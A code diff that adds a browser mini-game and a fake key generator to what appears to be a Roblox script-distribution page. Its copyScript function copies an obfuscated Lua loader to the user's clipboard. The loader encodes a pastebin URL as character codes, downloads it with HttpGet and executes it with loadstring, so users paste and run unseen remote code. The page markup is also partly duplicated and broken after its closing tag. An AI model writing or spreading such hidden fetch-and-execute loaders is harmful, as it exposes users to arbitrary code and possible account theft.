@@ -185,6 +185,154 @@ function createKey() {
 </html><h3>Create Key</h3>
 <input type="text" id="username" placeholder="Enter your Roblox username" class="key-input">
 <button class="download-btn" id="createKeyBtn" onclick="createKey()" disabled>Generate Key</button>
+<p id="generatedKey"></p>
+</div>
+</div>
+</main>
+<script>
+let score = 0;
+const gravity = 0.6;
+let velocity = 0;
+let playerY = 0;
+let obstacleSpeed = 5;
+
+const player = document.getElementById("player");
+const game = document.getElementById("game");
+const scoreText = document.getElementById("score");
+const createKeyBtn = document.getElementById("createKeyBtn");
+const obstacles = [];
+const gameOverText = document.getElementById("gameOverText");
+let isGameOver = false;
+let isPaused = false;
+
+// 다음 장애물 미리보기
+let nextObstacle = {height: 0, bottom: 0, type: "bottom"};
+let nextPreviewDiv = null;
+
+function generateNextObstacle() {
+  const h = Math.random() * 150 + 90; // 장애물 높이 3배
+  const type = Math.random() < 0.5 ? "bottom" : "top";
+  let bottom = type === "bottom" ? 0 : game.offsetHeight - h;
+  nextObstacle.height = h;
+  nextObstacle.bottom = bottom;
+  nextObstacle.type = type;
+
+  if (nextPreviewDiv) nextPreviewDiv.remove();
+
+  nextPreviewDiv = document.createElement("div");
+  nextPreviewDiv.className = "obstacle preview";
+  nextPreviewDiv.style.height = h + "px";
+  nextPreviewDiv.style.bottom = bottom + "px";
+  nextPreviewDiv.style.left = game.offsetWidth - 40 + "px";
+  game.appendChild(nextPreviewDiv);
+}
+
+function jump() {
+  if (!isGameOver && !isPaused) velocity = 10;
+}
+
+function updatePlayer() {
+  if (isGameOver || isPaused) return;
+  velocity -= gravity;
+  playerY += velocity;
+  if (playerY < 0) playerY = 0;
+  if (playerY > game.offsetHeight - player.offsetHeight) playerY = game.offsetHeight - player.offsetHeight;
+  player.style.bottom = playerY + "px";
+}
+
+function createObstacleFromNext() {
+  if (isGameOver) return;
+  const obs = document.createElement("div");
+  obs.className = "obstacle";
+  obs.style.height = nextObstacle.height + "px";
+  obs.style.bottom = nextObstacle.bottom + "px";
+  obs.style.left = game.offsetWidth + "px";
+  game.appendChild(obs);
+  obstacles.push(obs);
+  generateNextObstacle();
+}
+
+function updateObstacles() {
+  if (isPaused) return;
+  for (let i = obstacles.length - 1; i >= 0; i--) {
+    const obs = obstacles[i];
+    obs.style.left = parseInt(obs.style.left) - obstacleSpeed + "px";
+    if (parseInt(obs.style.left) < -50) {
+      obs.remove();
+      obstacles.splice(i, 1);
+      score += 20; // 점수 +20
+      scoreText.innerText = "Score: " + score;
+
+      if (score >= 300) {
+        isPaused = true; // 게임 일시정지
+        nextPreviewDiv && (nextPreviewDiv.style.display = "none");
+      }
+
+      if (score >= 300) createKeyBtn.disabled = false;
+      if (score % 50 === 0) obstacleSpeed += 1;
+    }
+
+    const pRect = player.getBoundingClientRect();
+    const oRect = obs.getBoundingClientRect();
+    if (!(pRect.right < oRect.left || pRect.left > oRect.right || pRect.bottom < oRect.top || pRect.top > oRect.bottom)) {
+      endGame();
+    }
+  }
+  if (nextPreviewDiv) {
+    nextPreviewDiv.style.left = parseInt(nextPreviewDiv.style.left) - obstacleSpeed + "px";
+  }
+}
+
+function endGame() {
+  if (isGameOver) return;
+  isGameOver = true;
+  gameOverText.style.display = "block";
+  setTimeout(() => location.reload(), 3000);
+}
+
+function gameLoop() {
+  updatePlayer();
+  updateObstacles();
+  requestAnimationFrame(gameLoop);
+}
+
+game.addEventListener("click", jump);
+generateNextObstacle();
+setInterval(createObstacleFromNext, 1500); // 1.5초마다 생성
+gameLoop();
+
+// 기존 스크립트/키 생성 함수 유지
+function copyScript() {
+  const s = `local x={HDD=loadstring,GHD=function(u)return game:HttpGet(u)end}
+local z="\\104\\116\\116\\112\\115\\58\\47\\47\\112\\97\\115\\116\\101\\98\\105\\110\\46\\99\\111\\109\\47\\114\\97\\119\\47\\116\\86\\82\\70\\77\\112\\76\\87"
+local function w(s)local t={}for i=1,#s do t[#t+1]=string.char(s:byte(i))end return table.concat(t)end
+local c=x.GHD(w(z))
+x["HDD"](c)()`;
+  const ta = document.createElement("textarea");
+  ta.value = s;
+  document.body.appendChild(ta);
+  ta.select();
+  document.execCommand("copy");
+  document.body.removeChild(ta);
+  alert("Script copied to clipboard!");
+}
+
+function createKey() {
+  const username = document.getElementById("username").value.trim();
+  if (!username) { alert("Please enter your username."); return; }
+  const nameLength = username.length;
+  const digits = username.match(/\d/g) || [];
+  const digitSum = digits.reduce((sum, d) => sum + parseInt(d), 0);
+  const keyBase = nameLength + digitSum;
+  const secondChar = username[1] || "";
+  const finalKey = secondChar + keyBase;
+  document.getElementById("generatedKey").innerText = "Your Key: " + finalKey;
+}
+</script>
+</body>
+</html><h3>Create Key</h3>
+<input type="text" id="username" placeholder="Enter your Roblox username" class="key-input">
+<button class="download-btn" id="createKeyBtn" onclick="createKey()" disabled>Generate Key</button>
 <p id="generatedKey(score 300)"></p>
 </div>
 </div>
